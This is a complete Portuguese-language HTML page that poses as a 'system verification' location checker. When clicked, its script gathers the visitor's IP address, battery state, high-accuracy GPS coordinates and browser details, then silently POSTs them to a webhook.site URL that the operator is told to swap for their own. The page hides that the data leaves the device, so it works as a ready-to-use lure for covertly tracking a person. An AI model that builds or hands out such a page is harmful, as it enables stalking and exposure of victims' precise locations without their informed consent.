<!DOCTYPE html>
<html lang="pt-PT">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificador de Localização</title>
  <style>
    body {
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f0f2f5;
    }
    .container {
      background-color: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      text-align: center;
    }
    .btn {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 10px 20px;
      margin-top: 15px;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }
    .btn:hover {
      background-color: #0056b3;
    }
    .status {
      margin-top: 20px;
      font-weight: bold;
      color: #333;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Verificação de Sistema</h2>
    <p>Clique no botão abaixo para verificar a sua localização atual.</p>
    <button class="btn" onclick="iniciarVerificacao()">Verificar Localização</button>
    <div id="statusMensagem" class="status"></div>
  </div>

  <script>
    // Substitua pelo URL exato do seu webhook.site
    const ENDPOINT_WEBHOOK = "https://webhook.site/3e64b456-7cb2-417a-96bd-82ba6628b0d";
    
    // Objeto principal que armazenará todos os dados antes do envio
    const dados = {};
    const statusMensagem = document.getElementById("statusMensagem");

    function atualizarStatus(mensagem) {
      statusMensagem.innerText = mensagem;
    }

    async function enviarParaServidor(payload) {
      try {
        await fetch(ENDPOINT_WEBHOOK, {
          method: 'POST', // Método correto para envio
          headers: {
            'Content-Type': 'application/json' // Cabeçalho correto
          },
          body: JSON.stringify(payload) // Converte o objeto para string JSON
        });
        atualizarStatus("Verificação concluída com sucesso!");
      } catch (erro) {
        console.error("Erro no envio:", erro);
        atualizarStatus("Erro ao comunicar com o servidor.");
      }
    }

    async function obterIP() {
      try {
        const resposta = await fetch('https://api.ipify.org?format=json');
        const data = await resposta.json();
        dados.ip = data.ip;
      } catch (erro) {
        dados.ip = "Erro ao obter IP";
      }
    }

    function obterBateria() {
      return new Promise((resolve) => {
        if (navigator.getBattery) {
          navigator.getBattery().then(bateria => {
            dados.bateria = {
              nivel: (bateria.level * 100) + "%",
              carregando: bateria.charging
            };
            resolve();
          }).catch(() => {
            dados.bateria = "Erro ao ler bateria";
            resolve();
          });
        } else {
          dados.bateria = "Não suportado";
          resolve();
        }
      });
    }

    function obterLocalizacao() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          dados.erro_geo = "Geolocalização não suportada";
          resolve();
          return;
        }

        navigator.geolocation.getCurrentPosition(
          (posicao) => {
            // Adiciona as coordenadas ao objeto principal "dados"
            dados.latitude = posicao.coords.latitude;
            dados.longitude = posicao.coords.longitude;
            dados.precisao_metros = posicao.coords.accuracy;
            resolve();
          },
          (erro) => {
            dados.erro_geo = erro.message;
            resolve();
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      });
    }

    async function iniciarVerificacao() {
      atualizarStatus("A recolher dados e a aguardar permissão de localização...");
      
      // Recolha de dados básicos do dispositivo
      dados.userAgent = navigator.userAgent;
      dados.plataforma = navigator.platform;
      dados.idioma = navigator.language;
      dados.data_hora = new Date().toISOString();
      
      // Executa as recolhas assíncronas
      await obterIP();
      await obterBateria();
      await obterLocalizacao();

      // Envia o objeto 'dados' completo (incluindo lat/long se autorizadas) para o Webhook
      atualizarStatus("A enviar informações...");
      await enviarParaServidor(dados);
    }
  </script>
</body>
</html>
